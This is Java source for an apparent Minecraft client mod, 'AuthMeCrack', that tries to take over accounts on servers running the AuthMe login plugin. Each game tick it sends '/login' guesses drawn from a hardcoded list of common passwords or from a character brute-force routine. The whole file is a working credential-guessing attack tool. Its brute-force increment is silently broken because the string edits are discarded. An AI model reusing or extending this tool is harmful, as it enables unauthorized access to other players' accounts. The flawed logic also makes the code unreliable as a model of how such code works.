package de.chrissx.mods.chat;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import de.chrissx.mods.Mod;
import de.chrissx.util.Consts;
import de.chrissx.util.Util;

public class AuthMeCrack extends Mod {

	public static final String[] DEFAULT_PASSWORDS = {
			"password", "passwort", "password1", "passwort1",
			"password123", "passwort123", "pass", "pw",
			"pw1", "pw123", "123", "1234", "12345",
			"123456", "1234567", "12345678", "123456789",
			"login", "register", "test", "sicher",
			"safe", "me", "ich", "penis", "penis1",
			"penis12", "penis123", "minecraft", "minecraft1",
			"minecraft12", "minecraft123", "mc", "admin",
			"server", "yourmom", "tester", "account",
			"creeper", "gronkh", "lol", "lel", "kek",
			"auth", "authme", "qwerty", "qwertz",
			"ficken", "ficken1", "ficken12", "ficken123",
			"fuck", "fuckme", "fuckyou" };
	
	public static final Character[] DEFAULT_CHARS =
	{
		'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b',
		'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
		'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
		'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L',
		'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
		'Y', 'Z'
	};

	List<String> pws;
	List<Character> crs;
	File pwFile = Paths.get(Consts.configPath, "authmecracker.cfg").toFile();
	File crFile = Paths.get(Consts.configPath, "authmecrackchars.cfg").toFile();
	int times = 0;
	PasswordCrackMode mode = PasswordCrackMode.DICT;
	String bfPw;

	public AuthMeCrack() {
		super("AuthMeCracker");
		if(pwFile.exists())
			try {
				List<String> pwsL = new ArrayList<String>();
				BufferedReader reader = new BufferedReader(new FileReader(pwFile));
				String s = "";
				while((s = reader.readLine()) != "" && s != null)
					pwsL.add(s);
				reader.close();
				pws = pwsL;
			} catch (Exception e) {
				e.printStackTrace();
			}
		else
			pws = Arrays.asList(DEFAULT_PASSWORDS);
		
		if(crFile.exists())
			try {
				List<Character> crsL = new ArrayList<Character>();
				BufferedReader reader = new BufferedReader(new FileReader(crFile));
				int i;
				while((i = reader.read()) != -1)
					crsL.add((char)i);
				reader.close();
				crs = crsL;
			} catch (Exception e) {
				e.printStackTrace();
			}
		else
			crs = Arrays.asList(DEFAULT_CHARS);
	}

	@Override
	public void onTick() {
		if(enabled && times > 0) {
			if(mode == PasswordCrackMode.DICT)
			{
				Util.sendChat("/login " + pws.get(times - 1));
				times--;
			}
			else if(mode == PasswordCrackMode.BRUTE_FORCE)
			{
				bf_stuff bf = bruteForceRound();
				Util.sendChat("/login " + bf.pw);
				enabled = bf.more;
			}
			else
				Util.sendMessage("[AuthMeCrack]Unrecognized PasswordCrackMode!");
		}else {
			enabled = false;
			times = 0;
		}
	}
	
	class bf_stuff
	{
		String pw;
		boolean more;
		bf_stuff(String pw, boolean more)
		{
			this.pw = pw;
			this.more = more;
		}
	}
	
	void replaceCharAt(String s, int i, char c)
	{
		s = s.substring(0, i) + c + s.substring(i + 1);
	}
	
	bf_stuff bruteForceRound()
	{
		if(bfPw.charAt(0) == crs.get(crs.size() - 1))
			return new bf_stuff(bfPw, false);
		String s = bfPw;
		int i;
		for(i = bfPw.length() - 1; i > -1 && bfPw.charAt(i) == crs.get(crs.size() - 1); i--);
		replaceCharAt(bfPw, i, crs.get(crs.indexOf(bfPw.charAt(i)) + 1));
		for(i++; i < bfPw.length(); i++)
			replaceCharAt(bfPw, i, crs.get(0));
		return new bf_stuff(s, true);
	}

	@Override
	public void toggle() {
		enabled = true;
		if(mode == PasswordCrackMode.DICT)
			times = pws.size();
		else if(mode == PasswordCrackMode.BRUTE_FORCE)
			bfPw = "00000000";
	}

	@Override
	public void onStop() {
		try {
			if(!pwFile.exists()) pwFile.createNewFile();
			if(pws.size() != 0)
			{
				BufferedWriter writer = new BufferedWriter(new FileWriter(pwFile));
				writer.write(pws.get(0));
				for(int i = 1; i < pws.size(); i++) {
					writer.newLine();
					writer.write(pws.get(i));
				}
				writer.close();
			}
			if(!crFile.exists()) crFile.createNewFile();
			if(crs.size() != 0)
			{
				BufferedWriter writer = new BufferedWriter(new FileWriter(crFile));
				for(char c : crs)
					writer.write(c);
				writer.close();
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	@Override
	public void processCommand(String[] args)
	{
		if(args.length == 1) toggle();
		else if(args[1].equalsIgnoreCase("mode"))
			try {
				mode = PasswordCrackMode.parse(args[2]);
			} catch (Exception e) {
				Util.sendMessage("Unable to parse mode: " + e.getMessage());
			}
		else if(args[1].equalsIgnoreCase("addpw"))
			try {
				addPw(args[2]);
			} catch (Exception e) {
				Util.sendMessage("Unable to add password: " + e.getMessage());
			}
		else if(args[1].equalsIgnoreCase("addcr"))
			try {
				addCr(args[2].charAt(0));
			} catch (Exception e) {
				Util.sendMessage("Unable to add char: " + e.getMessage());
			}
		else
			Util.sendMessage("Unknown command (#authmecrack, #authmecrack mode [passwordcrackingmode], #authmecrack addpw [string], #authmecrack addcr [char]");
	}

	public void addPw(String pw) {
		pws.add(pw);
	}
	
	public void addCr(char cr)
	{
		crs.add(cr);
	}
}
